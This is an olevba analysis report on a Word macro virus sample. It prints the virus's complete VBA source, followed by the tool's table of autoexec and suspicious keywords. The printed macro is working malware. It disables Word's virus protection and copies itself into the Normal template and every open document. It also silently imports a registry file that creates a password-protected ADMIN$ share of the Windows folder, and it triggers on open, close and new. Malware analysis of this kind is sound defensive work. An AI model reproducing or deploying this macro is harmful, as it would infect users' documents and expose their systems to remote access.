olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-10e6c3068687962af760b374660061cd22ee5bf7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-10e6c3068687962af760b374660061cd22ee5bf7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'ADMIN'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If Dir("C:\WINDOWS\Network.dll") <> "" Then
        Exit Sub
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'ADMIN'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'ADMIN'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.deletelines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
    Dim Ruta As String, Archivo As String, Var As Variant
    Ruta = "C:\WINDOWS\"
    Archivo = "System.dll"
    If Dir(Ruta & Archivo) = "" Then
        Open Ruta & Archivo For Output As #1
        Print #1, "REGEDIT4"
        Print #1, ""
        Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\ADMIN$]"
        Print #1, Chr(34) & "Flags" & Chr(34) & "=dword:00000302"
        Print #1, Chr(34) & "Type" & Chr(34) & "=dword:00000000"
        Print #1, Chr(34) & "Path" & Chr(34) & "=" & Chr(34) & "C:\\WINDOWS" & Chr(34)
        Print #1, Chr(34) & "Parm2enc" & Chr(34) & "=hex:"
        Print #1, Chr(34) & "Parm1enc" & Chr(34) & "=hex:72,d5,0a,eb"
        Print #1, Chr(34) & "Remark" & Chr(34) & "=" & String(2, 34)
        Print #1, ""
        Close #1
    End If
    Var = Shell("RegEdit.exe /S " & Ruta & Archivo)
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub




















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Network.dll         |Executable file name                         |
|IOC       |System.dll          |Executable file name                         |
|IOC       |RegEdit.exe         |Executable file name                         |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

